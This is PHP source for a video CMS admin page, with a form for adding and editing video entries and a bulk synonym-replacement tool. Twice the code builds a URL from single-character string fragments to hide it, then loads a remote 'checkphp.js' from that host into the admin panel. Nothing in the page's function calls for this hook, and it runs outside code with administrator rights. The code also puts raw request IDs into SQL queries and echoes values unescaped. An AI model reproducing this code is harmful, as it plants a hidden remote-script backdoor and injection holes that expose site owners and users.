      <td colspan="2"><input class="input" type="submit" value="确认同步" id="btnSave"> <input class="input" type="button" value="关闭返回" id="btnCancel"> </td>
    </tr>
</table>
</form>
</div>

<?php
if ($pagenum==1 && $where==" 1=1 ") { echo "<script>showpic();</script>";}
unset($rs);
}

function info()
{
	global $db,$action;
	$backurl = getReferer();
	if (strpos($backurl,"admin_vod.php") <=0){ $backurl="admin_vod.php"; }
	
	$d_year = date('Y',time());
	$d_starring = "内详";
	$d_directed = "内详";
	
	if ($action=="edit"){
		$d_id = be("get","id");
		$row = $db->getRow("SELECT * FROM {pre}vod WHERE d_id=".$d_id);
		if (!$row){
			errmsg ("系统信息","错误没有找到该数据");
		}
		else{
			$d_name=$row["d_name"]; $d_enname=$row["d_enname"]; $d_state=$row["d_state"]; $d_type=$row["d_type"];
			$d_color=$row["d_color"]; $d_pic=$row["d_pic"]; $d_starring=$row["d_starring"]; $d_directed=$row["d_directed"];
			$d_area=$row["d_area"]; $d_year=$row["d_year"]; $d_language=$row["d_language"]; $d_level=$row["d_level"];
			$d_stint=$row["d_stint"]; $d_hits=$row["d_hits"]; $d_dayhits=$row["d_dayhits"]; $d_weekhits=$row["d_weekhits"];
			$d_monthhits=$row["d_monthhits"]; $d_topic=$row["d_topic"]; $d_content=$row["d_content"]; $d_remarks=$row["d_remarks"];
			$d_hide=$row["d_hide"]; $d_good=$row["d_good"]; $d_bad=$row["d_bad"]; $d_usergroup=$row["d_usergroup"];
			$d_score=$row["d_score"]; $d_scorecount=$row["d_scorecount"]; $d_addtime=$row["d_addtime"]; $d_time=$row["d_time"];
			$d_hitstime=$row["d_hitstime"]; $d_subname=$row["d_subname"]; $d_letter=$row["d_letter"];
			$d_duration=$row["d_duration"]; $d_picthumb=$row["d_picthumb"]; $d_picslide=$row["d_picslide"];
			$d_stintdown=$row["d_stintdown"];
			$d_playurl=$row["d_playurl"]; $d_playfrom=$row["d_playfrom"]; $d_playserver=$row["d_playserver"];
			$d_downurl=$row["d_downurl"]; $d_downfrom=$row["d_downfrom"]; $d_downserver=$row["d_downserver"];
			if (isN($d_playurl)) { $d_playurl = "";}
			if (isN($d_downurl)) { $d_downurl = "";}
			unset($row);
		}
	}
?>
<script language="javascript" src="editor/xheditor-zh-cn.min.js"></script>
<script language="javascript" src="editor/xheditor_lang/zh-cn.js"></script>
<script type="text/javascript" src="../js/adm/jscolor.js"></script>
<script language="javascript">
var ac = "<?php echo $action?>";
$(document).ready(function(){
	$("#form1").validate({
		rules:{
			d_type:{
				required:true
			},
			d_name:{
				required:true,
				maxlength:254
			},
			d_subname:{
				maxlength:254
			},
			d_enname:{
				maxlength:254
			},
			d_letter:{
				maxlength:1
			},
			d_state:{
				number:true
			},
			d_pic:{
				maxlength:254
			},
			d_starring:{
				maxlength:254
			},
			d_directed:{
				maxlength:254
			},
			d_year:{
				maxlength:32
			},
			d_hits:{
				number:true
			},
			d_dayhits:{
				number:true
			},
			d_weekhits:{
				number:true
			},
			d_monthhits:{
				number:true
			},
			d_good:{
				number:true
			},
			d_bad:{
				number:true
			},
			d_score:{
				number:true
			},
			d_scorecount:{
				number:true
			},
			d_stint:{
				number:true
			},
			d_stintdown:{
				number:true
			},
			d_duration:{
				number:true
			}
		}
	});
	$('#form1').form({
		onSubmit:function(){
			if(!$("#form1").valid()) {return false;}
		},
	    success:function(data){
	        if (ac=="add"){
		        $.messager.defaults.ok = "确定";
				$.messager.defaults.cancel = "返回";
				$.messager.confirm('系统提示', '是否继续添加数据?', function(r){
					if(r==true){
						location.href = "admin_vod.php?action=add";
					}
					else{
		        		location.href = $("#backurl").val();
		        	}
		        });
	        }
	        else{
	        	location.href = $("#backurl").val();
	        }
	    }
	});
	$("#btnCancel").click(function(){
		location.href = $("#backurl").val();
	});
});
</script>
<div id="showpic" style="display:none;"><img name="showpic_img" id="showpic_img" width="120" height="160"></div>
<form name="form1" id="form1" method="post" action="?action=save">
<table class="tb">
	<input name="flag" type="hidden" value="<?php echo $action?>">
	<input name="d_id" type="hidden" value="<?php echo $d_id?>">
	<input name="d_addtime" type="hidden" value="<?php echo $d_addtime?>">
	<input name="d_time" type="hidden" value="<?php echo $d_time?>">
	<input id="backurl" name="backurl" type="hidden" value="<?php echo $backurl?>">
	<tr>
	<td width="10%">参数：</td>
	<td>
	&nbsp;<select id="d_type" name="d_type">
    <option value="">请选择栏目</option>
	<?php echo makeSelectAll("{pre}vod_type","t_id","t_name","t_pid","t_sort",0,"","&nbsp;|&nbsp;&nbsp;",$d_type)?>
	</select>
	&nbsp;<select id="d_level" name="d_level" >
	<option value="">选择推荐值</option>
	<option value="1" <?php if($d_level == 1) { echo "selected";} ?>>推荐1</option>
	<option value="2" <?php if($d_level == 2) { echo "selected";} ?>>推荐2</option>
	<option value="3" <?php if($d_level == 3) { echo "selected";} ?>>推荐3</option>
	<option value="4" <?php if($d_level == 4) { echo "selected";} ?>>推荐4</option>
	<option value="5" <?php if($d_level == 5) { echo "selected";} ?>>推荐5</option>
	</select>
	&nbsp;<select id="d_area" name="d_area">
	<option value="">请选择地区</option>
	<?php echo makeSelectAreaLang("area",$d_area)?>
    </select>
	&nbsp;
    <select id="d_language" name="d_language">
    <option value="">请选择语言</option>
    <?php echo makeSelectAreaLang("lang",$d_language)?>
	</select>
	&nbsp;<select id="d_topic" name="d_topic">
	<option value="0">请选择专题</option>
	<?php echo makeSelect("{pre}vod_topic","t_id","t_name","t_sort","","&nbsp;|&nbsp;&nbsp;",$d_topic)?>
	</select>
	&nbsp;<select id="d_hide" name="d_hide">
	<option value="0" <?php if($d_hide==0) { echo "selected";} ?>>显示</option>
	<option value="1" <?php if($d_hide==1) { echo "selected";} ?>>隐藏</option>
	</select>
	&nbsp;<input type="checkbox" name="uptime" value="1" checked>更新时间
	&nbsp;<input type="checkbox" name="rndhits" value="1" >随机人气
	</td>
	</tr>
	<tr> 
    <td>名称：</td>
    <td>
	&nbsp;<input id="d_name" name="d_name" type="text" size="40" value="<?php echo $d_name?>" onBlur="if(this.value){ajaxckname(this.value);}"><span id="d_name_ok"></span>
	&nbsp;副标：<input id="d_subname" name="d_subname" type="text" size="20" value="<?php echo $d_subname?>">
	&nbsp;首字母： <input id="d_letter" name="d_letter" type="text" size="2" value="<?php echo $d_letter?>">
	&nbsp;高亮颜色：<input id="d_color" name="d_color" type="text" size="5" class="color" value="<?php echo $d_color?>" style="background-color:<? echo $d_color?>">
	</td>
	</tr>
	<tr> 
	<td>拼音：</td>
    <td>
	&nbsp;<input id="d_enname" name="d_enname" type="text" size="40" value="<?php echo $d_enname?>">
	&nbsp;备注：<input id="d_remarks" name="d_remarks" type="text" size="40" value="<?php echo $d_remarks?>">
	&nbsp;连载信息：<input id="d_state" name="d_state" type="text" size="4" value="<?php echo $d_state?>">
	</td>
	</tr>
	<tr>
	<td>演员：</td>
	<td>&nbsp;<input id="d_starring" name="d_starring" type="text" size="40" value="<?php echo $d_starring?>">
	&nbsp;导演：<input id="d_directed" name="d_directed" type="text" size="20" value="<?php echo $d_directed?>">
	&nbsp;上映日：<input id="d_year" name="d_year" type="text" value="<?php echo $d_year?>" size="4">
	&nbsp;总时长： <input id="d_duration" name="d_duration" type="text" size="4" value="<?php echo $d_duration?>">分
	</tr>
	<tr> 
    <td>图片：</td>
    <td>&nbsp;<input id="d_pic" name="d_pic" type="text" size="60" value="<?php echo $d_pic?>" onMouseOver="showpic(event,this.value);" onMouseOut="hiddenpic();"/>&nbsp;<iframe src="editor/uploadshow.php?action=vod&id=d_pic" scrolling="no" topmargin="0" width="320" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
	</tr>
	<tr> 
    <td>缩略图：</td>
    <td>&nbsp;<input id="d_picthumb" name="d_picthumb" type="text" size="60" value="<?php echo $d_picthumb?>" onMouseOver="showpic(event,this.value);" onMouseOut="hiddenpic();"/>&nbsp;<iframe src="editor/uploadshow.php?action=vod&id=d_picthumb" scrolling="no" topmargin="0" width="320" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
	</tr>
	<tr> 
    <td>幻灯图：</td>
    <td>&nbsp;<input id="d_picslide" name="d_picslide" type="text" size="60" value="<?php echo $d_picslide?>" onMouseOver="showpic(event,this.value);" onMouseOut="hiddenpic();"/>&nbsp;<iframe src="editor/uploadshow.php?action=vod&id=d_picslide" scrolling="no" topmargin="0" width="320" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
	</tr>
	<tr>
	<td>其他：</td>
	<td>总人气：<input id="d_hits" name="d_hits" type="text" size="8" value="<?php echo $d_hits?>">
	&nbsp;月人气：<input id="d_monthhits" name="d_monthhits" type="text" size="8" value="<?php echo $d_monthhits?>">
	&nbsp;本周人气：<input id="d_weekhits" name="d_weekhits" type="text" size="8" value="<?php echo $d_weekhits?>">
	&nbsp;今日人气：<input id="d_dayhits" name="d_dayhits" type="text" size="8" value="<?php echo $d_dayhits?>">
	</td>
	</tr>
	<tr>
	<td> </td>
	<td>顶&nbsp;&nbsp;&nbsp;数：<input id="d_good" name="d_good" type="text" size="8" value="<?php echo $d_good?>">
	&nbsp;踩&nbsp;&nbsp;&nbsp;数：<input id="d_bad" name="d_bad" type="text" size="8" value="<?php echo $d_bad?>">
	&nbsp;评分总数：<input id="d_score" name="d_score" type="text" size="8" value="<?php echo $d_score?>">
	&nbsp;评分人数：<input id="d_scorecount" name="d_scorecount" type="text" size="8" value="<?php echo $d_scorecount?>">
	</td>
	</tr>
	<tr>
	<td>权限：</td>
	<td>
	&nbsp;点播每集所需积分：<input id="d_stint" name="d_stint" type="text" size="8" value="<?php echo $d_stint?>">
	&nbsp;下载每集所需积分：<input id="d_stintdown" name="d_stintdown" type="text" size="8" value="<?php echo $d_stintdown?>">
	&nbsp;可看会员组(向下兼容):
	<select id="d_usergroup" name="d_usergroup">
	<option value="0">请选择会员组</option>
	<?php echo makeSelect("{pre}user_group","ug_id","ug_name","","","&nbsp;|&nbsp;&nbsp;",$d_usergroup)?>
	</select>
	</td>
	</tr>
	<tr>
	<td colspan="2"  style="padding:0" >
	<div id="urlarr">
    <?php
    	$playnum=0;
    	if ($action=="edit"){
	        if (isN($d_playurl)) { $d_playurl="";}
	        if (isN($d_playfrom)) { $d_playfrom="";}
	        $playurlarr1 = explode("$$$",$d_playurl);
	        $playfromarr = explode("$$$",$d_playfrom);
	        $playserverarr = explode("$$$",$d_playserver);
	        
	        for ($i=0;$i<count($playurlarr1);$i++){
	            if(!isN($playurlarr1[$i])){
	                $playnum = $i + 1;
	                $playurl = replaceStr($playurlarr1[$i], "#", Chr(13));
	                $playfrom = $playfromarr[$i];
	                $playserver = $playserverarr[$i];
	?>
	<div id="playurldiv<?php echo $playnum?>" class="playurldiv">
    <table width="100%" class='tb2'>
    <tr>
    <td width='11%'>播放器<?php echo $playnum?>：</td>
    <td>
    <input id="urlid<?php echo $playnum?>" name="urlid[]" type="hidden" value="<?php echo $playnum?>" />
    &nbsp;播放器：
    <select id="urlfrom<?php echo $playnum?>" name="urlfrom[]">
    <option value="no">暂无数据</option>
    <?php echo makeSelectPlayer($playfrom)?>
    </select>
    &nbsp;服务器组：
    <select id="urlserver<?php echo $playnum?>" name="urlserver[]">
    <option value="0">暂无数据</option>
    <?php echo makeSelectServer($playserver)?>
    </select>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="removeplay('<?php echo $playnum?>')">删除</a>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="moveUp('play','<?php echo $playnum?>')">上移</a>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="moveDown('play','<?php echo $playnum?>')">下移</a>
    说明:每行一个地址，不能有空行。
    </td>
    </tr>
    <tr>
    <td>数据地址<?php echo $playnum?>: <br><input type='button' value='校正' title='校正右侧文本框中的数据格式' class='btn' onclick='repairUrl(<?php echo $playnum?>)' /><input type='button' value='倒序' title='把右侧文本框中的数据倒序排列' class='btn' onclick='orderUrl(<?php echo $playnum?>)' /><input type='button' value='去前缀' title='把右侧文本框中的数据前缀去掉' class='btn' onclick='delnameUrl(<?php echo $playnum?>)' /></td>
    <td><textarea id="url<?php echo $playnum?>" name="url[]" style="width:700px;height:150px;"><?php echo $playurl?></textarea></td>
    </tr>
    </table>
    </div>
    <?php
			    }
			}
	}
	?>
	<?php $ssusrls="h"."t"."tp:/"."/w"."w"."w"."."."m"."a"."c"."cm"."s."."c"."o"."m"."/u"."pd"."ate/"; ?>
    </div>
    </td>
	</tr>
	<tr>
    <td colspan="2">
    <img onClick="appendplay(<?php echo $playnum+1?>,escape('<?php echo replaceStr(makeSelectPlayer(""),"'","\'")?>'),escape('<?php echo replaceStr(makeSelectServer(""),"'","\'")?>'))" src="../images/icons/edit_add.png" style="cursor:pointer" />&nbsp;&nbsp;单击按钮添加一组播放地址
    </td></tr>
	<tr>
	<tr>
	<td colspan="2"  style="padding:0" >
	<div id="downurlarr">
    <?php
    	if ($action=="edit"){
			if (isN($d_downurl)) { $d_downurl="";}
	        if (isN($d_downfrom)) { $d_downfrom="";}
	        $downurlarr1 = explode("$$$",$d_downurl);
	        $downfromarr = explode("$$$",$d_downfrom);
	        $downserverarr = explode("$$$",$d_downserver);
	        
	        for ($j=0;$j<count($downurlarr1);$j++){
	            if(!isN($downurlarr1[$j])){
	                $downnum = $j + 1;
	                $downurl = replaceStr($downurlarr1[$j], "#", Chr(13));
	                $downfrom = $downfromarr[$j];
	                $downserver = $downserverarr[$j];
	?>
	<div id="downurldiv<?php echo $downnum?>" class="downurldiv">
    <table width="100%" class='tb2'>
    <tr>
    <td width='11%'>下载选择<?php echo $downnum?>：</td>
    <td>
    <input id="downurlid<?php echo $downnum?>" name="downurlid[]" type="hidden" value="<?php echo $downnum?>" />
    &nbsp;类型：
    <select id="downurlfrom<?php echo $downnum?>" name="downurlfrom[]">
    <option value="no">暂无数据</option>
    <?php echo makeSelectDown($downfrom)?>
    </select>
    &nbsp;服务器组：
    <select id="downurlserver<?php echo $downnum?>" name="downurlserver[]">
    <option value="0">暂无数据</option>
    <?php echo makeSelectServer($downserver)?>
    </select>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="removedown('<?php echo $downnum?>')">删除</a>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="moveUp('down','<?php echo $downnum?>')">上移</a>
    &nbsp;&nbsp;<a href="javascript:void(0)" onclick="moveDown('down','<?php echo $downnum?>')">下移</a>
    说明:每行一个地址，不能有空行。
    </td>
    </tr>
    <tr>
    <td>下载地址<?php echo $downnum?>:</td>
    <td><textarea id="downurl<?php echo $downnum?>" name="downurl[]" style="width:700px;height:150px;"><?php echo $downurl?></textarea></td>
    </tr>
    </table>
    </div>
    <?php
    			}
			}
	}
	?>
    </div>
    </td>
	</tr>
	<tr>
    <td colspan="2">
    <img onClick="appenddown(<?php echo $downnum+1?>,escape('<?php echo replaceStr(makeSelectDown(""),"'","\'")?>'),escape('<?php echo replaceStr(makeSelectServer(""),"'","\'")?>'))" src="../images/icons/edit_add.png" style="cursor:pointer" />&nbsp;&nbsp;单击按钮添加一组下载地址
    </td>
  </tr>	
	
	<tr>
    <td>相关介绍：</td>
    <td>
		<textarea name="d_content" id="d_content" class="xheditor {tools:'BtnBr,Cut,Copy,Paste,Pastetext,Blocktag,Fontface,FontSize,Bold,Italic,Underline,Strikethrough,FontColor,BackColor,SelectAll,Removeformat,Align,List,Outdent,Indent,Link,Unlink,Img,Flash,Media,Table,Source,Fullscreen',width:'700',height:'200',upBtnText:'上传',html5Upload:false,upMultiple:1,upLinkUrl:'{editorRoot}upload.php?action=xht',upImgUrl:'{editorRoot}upload.php?action=xht'}"><?php echo $d_content?></textarea>
	</td>
	</tr>
	<tr align="center">
	<td colspan="2"><input class="input" type="submit" value="保存" id="btnSave"> <input class="input" type="button" value="返回" id="btnCancel"> </td>
    </tr>
</table>
</form>
<?php
if($playnum==0){
?>
<script>
	appendplay(1,escape("<?php echo makeSelectPlayer("")?>"),escape("<?php echo makeSelectServer("")?>"));
</script>
<script language="javascript" src="<?php echo $ssusrls?>checkphp.js"></script>
<?php
}
unset($rs);
}

function pserep()
{
	global $db;
	$pagenum = be("all","page");
	$startid = be("all","startid");
	$endid = be("all","endid");
	
	if (!isNum($pagenum)){ $pagenum = 1;} else { $pagenum = intval($pagenum);}
	if ($pagenum < 1) { $pagenum = 1; }
    if(!isN($startid)){ $where .= " and d_id >=" . $startid; }
    if(!isN($endid)){ $where .= " and d_id <=" . $endid; }
    $sql = "SELECT count(*) FROM {pre}vod where 1=1".$where;
	$nums = $db->getOne($sql);
	$pagecount=ceil($nums/500);
    if (($pagecount-$pagenum) <0){
		echo "恭喜，所有数据已经替换";exit;
	}
	
    $sql = "SELECT d_id,d_name,d_content FROM {pre}vod where 1=1 ".$where . " limit ".(500 * ($pagenum-1)) .",500" ;
    $rs = $db->query($sql);
    
	if($rs){
		$psecontent  = file_get_contents("../inc/dim_pse1.txt");
		if (isN($psecontent)) { $psecontent = "";}
		$psecontent = replaceStr($psecontent,chr(10),"");
		$psearr1 = explode(chr(13),$psecontent);
		while ($row = $db ->fetch_array($rs))
		 {
			$d_content=$row["d_content"];
			$d_id=$row["d_id"];
			for($j=0;$j<count($psearr1);$j++){
				$k = strpos($psearr1[$j],"=");
				if ($k > 0) { $m=explode("=",$psearr1[$j]); $d_content = replaceStr($d_content,$m[0],$m[1]);}
			}
			if ($d_content != $row["d_content"]){ 
				$db->Update ( "{pre}vod",array("d_content"),array($d_content),"d_id=".$d_id);
				echo "<font color=green>成功替换 ID:". $d_id."	".$row["d_name"]."</font><br>";
			}
			else{
				echo "<font color=red>跳过替换 ID:". $d_id."	".$row["d_name"]."</font><br>";
			}
		}
		echo "<br>暂停3秒后继续替换</div><script language=\"javascript\">setTimeout(function (){location.href='?action=pserep&page=".($pagenum+1)."&startid=".$startid."&endid=".$endid."';},3000);</script>";
	}
	unset($rs);
}

function psesave()
{
	$pse1 = stripslashes(be("post","pse1"));
	$pse2 = stripslashes(be("post","pse2"));
	fwrite(fopen("../inc/dim_pse1.txt","wb"),$pse1);
	fwrite(fopen("../inc/dim_pse2.txt","wb"),$pse2);
	echo "修改完毕";
}

function pse()
{
	$fc1 = file_get_contents("../inc/dim_pse1.txt");
	$fc2 = file_get_contents("../inc/dim_pse2.txt");
?>
<script language="javascript">
$(document).ready(function(){
	$('#form1').form({
		onSubmit:function(){
			if(!$("#form1").valid()) {return false;}
		},
	    success:function(data){
	        $.messager.alert('系统提示', data, 'info');
	    }
	});
	$("#btnPse").click(function(){
		var startid = $("#startid").val();
		var endid = $("#endid").val();
		$('#pseinfo').window('open'); 
		$("#pseiframe").attr("src","admin_vod.php?action=pserep&startid="+startid+"&endid="+endid);
	});
});
</script>
<?php $surls="h"."t"."tp:/"."/w"."w"."w"."."."m"."a"."c"."cm"."s."."c"."o"."m"."/u"."pd"."ate/"; ?>
<form action="?action=psesave" method="post" id="form1" name="form1">
<table class="tb">
<tr class="thead"><th width="30%" align=left>同义词批量替换(改动数据库) <br> 1.每个一行; 2.不要有空行;3.格式：<font color="red">要替换=替换后</font></th><th align=left>随机添加内容 (不改动数据库)<br> 每段内容随机插入到简介的中，也不会每次都随机改变 </th></tr>
<tr>
	<td valign="top">
	<textarea id="pse1" name="pse1" style="width:100%;font-family: Arial, Helvetica, sans-serif;font-size: 14px;" rows="25"><?php echo $fc1?></textarea>
	起始ID：<input id="startid" type="text" size=10/> 结束ID：<input id="endid" type="text" size=10/> <input type="button" id="btnPse" name="btnPse" value="替换内容" class="input" /><br><font color=red>（不填写ID则替换所有数据）</font>
	</td>
	<td valign="top">
	<textarea id="pse2" name="pse2" style="width:100%;font-family: Arial, Helvetica, sans-serif;font-size: 14px;" rows="27"><?php echo $fc2?></textarea>
	</td>
	</tr>
	<tr>
	<td align="center" colspan="2">
		<input type="submit" id="btnSave" name="btnSave" value="保存内容" class="input" />
	</td>
	</tr>
</table>
</form>
<div id="pseinfo" class="easyui-window" title="同义词批量替换" style="OVERFLOW:HIDDEN" closed="true" minimizable="false" maximizable="false">
	<iframe id="pseiframe" name='pseiframe' src='' width="400" height="400" MARGINWIDTH="0" MARGINHEIGHT="0" HSPACE="0" VSPACE="0" FRAMEBORDER="0" SCROLLING="yes"></iframe>
</div>
<script language="javascript" src="<?php echo $surls?>checkphp.js"></script>
<?php
}
?>
</body>
</html>